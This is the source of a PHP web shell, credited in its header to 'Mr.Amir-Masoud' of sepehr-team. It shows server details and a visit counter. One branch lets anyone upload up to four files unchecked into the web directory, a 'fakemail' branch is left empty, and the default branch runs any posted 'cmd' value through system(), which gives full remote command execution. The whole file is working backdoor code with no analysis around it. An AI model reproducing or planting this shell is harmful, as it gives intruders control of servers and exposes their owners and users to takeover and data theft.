<?php
/*
/ This Sheller Design And Coded By: Mr.Amir-Masoud
/ Y!ID: mr.amir-masoud@att.net
/ Mail: am1r@dr.com
/the time im in sepehr-team.org in sheller is match with sepehr-team
*/
session_start();

if (empty($_SESSION['count'])) {
 $_SESSION['count'] = 1;
} else {
 $_SESSION['count']++;
}
?><?php
$server_software = getenv("SERVER_SOFTWARE"); 
?><?php echo wordwrap(php_uname(),90,"<br>",1); ?><?php echo $_SESSION['count']; ?><?php
if(ISSET($_GET['page'])){
    if($_GET{'page'}=='upload'){
        ?><?php 
 $target = ""; 
 $target = $target . basename( $_FILES['uploaded']['name']) ; 
 $ok=1; 
 if(move_uploaded_file($_FILES['uploaded']['tmp_name'], $target)) 
 {
 echo "The File ". basename( $_FILES['uploadedfile']['name']). " has been uploaded<br />";
 } 
 else {
 echo "";
 }
  $target = ""; 
 $target = $target . basename( $_FILES['uploaded1']['name']) ; 
 $ok=1; 
 if(move_uploaded_file($_FILES['uploaded1']['tmp_name'], $target)) 
 {
 echo "";
 } 
 else {
 echo "";
 }
   $target = ""; 
 $target = $target . basename( $_FILES['uploaded2']['name']) ; 
 $ok=1; 
 if(move_uploaded_file($_FILES['uploaded2']['tmp_name'], $target)) 
 {
 echo "";
 } 
 else {
 echo "";
 }
    $target = ""; 
 $target = $target . basename( $_FILES['uploaded3']['name']) ; 
 $ok=1; 
 if(move_uploaded_file($_FILES['uploaded3']['tmp_name'], $target)) 
 {
 echo "";
 } 
 else {
 echo "";
 }
 
 ?><?php
    }elseif($_GET['page']=='fakemail'){
        ?><?php
    }
}else{

?><?php

						if(isset($_POST['cmd']))
						{
   $cmd = $_POST['cmd'];
   if($cmd == "")
   {
	   echo "                              Please Insert Command!";
   }
   elseif(isset($cmd))
   {
   $output = system($cmd);

printf("$output\n"); 
   }
}

						?>